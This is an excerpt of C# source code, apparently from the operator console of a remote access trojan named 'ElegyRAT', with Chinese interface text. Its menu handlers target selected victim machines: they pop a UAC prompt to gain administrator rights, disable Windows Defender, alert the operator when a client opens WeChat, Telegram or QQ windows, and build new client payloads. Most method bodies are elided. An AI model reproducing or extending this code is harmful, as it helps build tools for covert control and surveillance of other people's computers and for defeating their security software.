    ...
    public partial class Form1 : Form
    {
        ...
        private void CheckFiles()
        {
            ...
            catch (Exception ex)
            {
                ...
                MessageBox.Show(ex.Message, "ElegyRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        ...
        private async void Form1_Load(object sender, EventArgs e)
        {
            ...
            ListviewDoubleBuffer.Enable(listView5);
        ...
        private void UpdateUI_Tick(object sender, EventArgs e)
        {
            ...
            lock (Settings.LockListviewClients)
                ...
                toolStripStatusLabel1.Text = $"在线 {listView1.Items.Count.ToString()}     选中 {listView1.SelectedItems.Count.ToString()}                    发送 {Methods.BytesToString(Settings.SentValue).ToString()}     接收 {Methods.BytesToString(Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
        }
        ...
        private void RunToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                string title = Interaction.InputBox("客户端打开特定窗口时发送通知", "标题", "微信, Telegram, QQ");
        ...
        private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                ...
                DialogResult dialogResult = MessageBox.Show(this, "Popup UAC prompt? ", "ElegyRAT | UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
        ...
        private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                ...
                DialogResult dialogResult = MessageBox.Show(this, "将仅在具有管理员权限的客户端上执行!", "ElegyRAT | 关闭 Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                if (dialogResult == DialogResult.Yes)
                {
                    try
                    {
        ...
        private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ...
            DialogResult dialogResult = MessageBox.Show(this, "你确定要卸载吗", "ElegyRAT | 卸载", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
        ...
        private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ...
            MessageBox.Show("无法使用'debug'版本生成，请使用'release'版本", "ElegyRAT | 生成客户端", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
#endif
